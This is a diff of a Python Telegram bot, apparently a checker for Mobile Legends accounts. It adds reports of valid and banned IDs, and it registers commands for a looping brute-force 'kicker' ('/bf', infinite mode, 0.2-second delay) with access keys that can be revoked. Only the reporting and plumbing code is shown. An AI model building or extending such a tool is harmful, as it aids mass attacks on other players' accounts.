+                output_file = f"{len(results)}DevId_Valid.txt"
                 with open(output_file, 'w', encoding='utf-8') as f:
                     for res in results:
                         f.write(format_result_line(res) + "\n")
@@ -2062,11 +2400,25 @@ class MLBBBot:
             else:
                 await context.bot.send_message(chat_id, "❌ No valid IDs found.")
 
+            if banned_results:
+                banned_file = f"{len(banned_results)}Banned_IDs.txt"
+                with open(banned_file, 'w', encoding='utf-8') as f:
+                    for res in banned_results:
+                        f.write(format_banned_line(res) + "\n")
+                with open(banned_file, 'rb') as f:
+                    await context.bot.send_document(
+                        chat_id, f,
+                        filename=banned_file,
+                        caption=f"🚫 Found {len(banned_results):,} banned accounts!"
+                    )
+                os.remove(banned_file)
+
             final_progress = (
                 f"✅ Task Complete!\n"
                 f"━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                 f"Total checked : {checked:,}\n"
                 f"Valid found   : {valid:,}\n"
+                f"Banned        : {banned:,}\n"
                 f"Failed        : {failed:,}\n"
                 f"Success rate  : {(valid / checked * 100) if checked > 0 else 0:.2f}%\n"
                 f"Total time    : {int(elapsed // 60)}m {int(elapsed % 60)}s\n"
@@ -2155,7 +2507,6 @@ class MLBBBot:
             elif data == "bf_mode_inf":
                 await self.bf_start_kick(update, context, total_loops=0, delay_sec=0.2)
             elif data == "bf_mode_custom":
-                # NEW: refuse if already running
                 if self._bf_is_active(user_id):
                     await query.answer("⚠️ Kicker already running! Use /stop_bf.", show_alert=True)
                     return
@@ -2240,7 +2591,6 @@ class MLBBBot:
 
 
 async def error_handler(update: object, context: ContextTypes.DEFAULT_TYPE) -> None:
-    """Global error handler for the bot."""
     logger.error(f"Update {update} caused error {context.error}")
     try:
         if isinstance(update, Update) and update.effective_message:
@@ -2266,7 +2616,7 @@ def main():
     application.add_handler(CommandHandler("revoke", bot.revoke_cmd))
     application.add_handler(CommandHandler("delkey", bot.delkey_cmd))
     application.add_handler(CommandHandler("bf", bot.bf_cmd))
-    application.add_handler(CommandHandler("bfstatus", bot.bfstatus_cmd)) 
+    application.add_handler(CommandHandler("bfstatus", bot.bfstatus_cmd))
     application.add_handler(CommandHandler("stop_bf", bot.stop_bf_cmd))
     application.add_handler(CallbackQueryHandler(bot.button_callback))
     application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, bot.handle_message))
